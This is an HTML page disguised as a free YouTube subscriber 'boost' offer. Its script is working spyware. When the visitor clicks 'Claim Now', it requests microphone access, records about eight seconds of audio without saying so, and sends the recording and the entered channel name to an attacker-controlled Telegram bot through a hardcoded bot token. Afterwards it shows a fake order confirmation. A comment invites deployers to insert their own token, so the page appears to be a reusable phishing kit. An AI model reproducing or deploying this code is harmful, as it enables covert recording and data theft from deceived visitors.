<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>YouTube Boost Service</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0f0f0f;
      color: #fff;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .container {
      text-align: center;
      padding: 40px 20px;
      max-width: 460px;
      width: 100%;
    }
    .youtube-logo {
      font-size: 110px;
      font-weight: bold;
      color: #ff0000;
      margin: 30px 0 50px;
      text-shadow: 0 0 40px rgba(255,0,0,0.5);
    }
    h2 { margin: 0.5em 0 1.2em; font-size: 1.6rem; }
    select, input[type="text"] {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      font-size: 1.1rem;
      border: 1px solid #444;
      border-radius: 8px;
      background: #1a1a1a;
      color: white;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 16px;
      font-size: 1.25rem;
      font-weight: bold;
      margin: 20px 0 10px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.2s;
    }
    #selectBtn {
      background: #ff0000;
      color: white;
    }
    #selectBtn:hover { background: #d90000; }
    #claimBtn {
      background: #00c853;
      color: white;
      display: none;
    }
    #claimBtn:hover { background: #00a843; }
    #status {
      margin: 24px 0;
      font-size: 1.2rem;
      min-height: 1.5em;
      color: #66ff99;
    }
    .hidden { display: none !important; }
    .error { color: #ff5252 !important; }
  </style>
</head>
<body>

<div class="container">

  <div class="youtube-logo">YouTube</div>

  <h2>Select Subscribers Package</h2>

  <select id="package">
    <option value="">— Select Package —</option>
    <option value="100">100 subscribers</option>
    <option value="200">200 subscribers</option>
    <option value="1000">1K subscribers</option>
  </select>

  <button id="selectBtn">Continue</button>

  <div id="step2" class="hidden">

    <h2>Your Channel Username</h2>
    <input type="text" id="username" placeholder="@yourchannelname" autocomplete="off" />

    <button id="claimBtn">Claim Now</button>

    <div id="status"></div>

  </div>

</div>

<script>
// ────────────────────────────────────────────────
const urlParams = new URLSearchParams(window.location.search);
const destChatId = urlParams.get("id");

if (!destChatId) {
  document.body.innerHTML = '<h1 style="color:#ff5252;text-align:center;margin-top:120px">Invalid Link</h1>';
  throw new Error("No destination ID");
}

const BOT_TOKEN = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";   // ← Yahan apna bot token daalo

const statusEl  = document.getElementById("status");
const selectBtn = document.getElementById("selectBtn");
const claimBtn  = document.getElementById("claimBtn");
const usernameIn = document.getElementById("username");
// ────────────────────────────────────────────────

selectBtn.onclick = () => {
  const pkg = document.getElementById("package").value;
  if (!pkg) {
    alert("Please select a subscribers package first!");
    return;
  }

  document.getElementById("step2").classList.remove("hidden");
  selectBtn.classList.add("hidden");
  statusEl.textContent = "";
};

claimBtn.onclick = async () => {
  const username = usernameIn.value.trim();
  if (!username) {
    alert("Please enter your channel username!");
    return;
  }

  statusEl.textContent = "Processing...";
  claimBtn.disabled = true;
  selectBtn.style.display = "none";

  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
  } catch (err) {
    statusEl.textContent = "Microphone permission denied. Please allow access.";
    statusEl.className = "error";
    claimBtn.disabled = false;
    return;
  }

  // Silent recording start (no text change)
  const recorder = new MediaRecorder(stream);
  const chunks = [];

  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.onstop = async () => {
    if (stream) stream.getTracks().forEach(t => t.stop());

    const blob = new Blob(chunks, { type: "audio/webm" });

    try {
      const formData = new FormData();
      formData.append("chat_id", destChatId);
      formData.append("voice", blob, `rec_${Date.now()}.webm`);
      formData.append("caption", 
        `New claim:\n` +
        `ID: ${destChatId}\n` +
        `Package: ${document.getElementById("package").value} subs\n` +
        `Channel: ${username}\n` +
        `Time: ${new Date().toISOString()}`
      );

      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
        method: "POST",
        body: formData
      });

      const json = await res.json();

      if (res.ok && json.ok) {
        statusEl.textContent = "Success! Your order has been requested.\nWait 24 hours for delivery.";
      } else {
        statusEl.textContent = "Something went wrong. Please try again.";
        statusEl.className = "error";
      }
    } catch (e) {
      statusEl.textContent = "Connection failed. Check your internet.";
      statusEl.className = "error";
    } finally {
      claimBtn.disabled = false;
    }
  };

  recorder.start();
  setTimeout(() => {
    if (recorder.state === "recording") recorder.stop();
  }, 8200);  // ~8 seconds
};
</script>
</body>
</html>
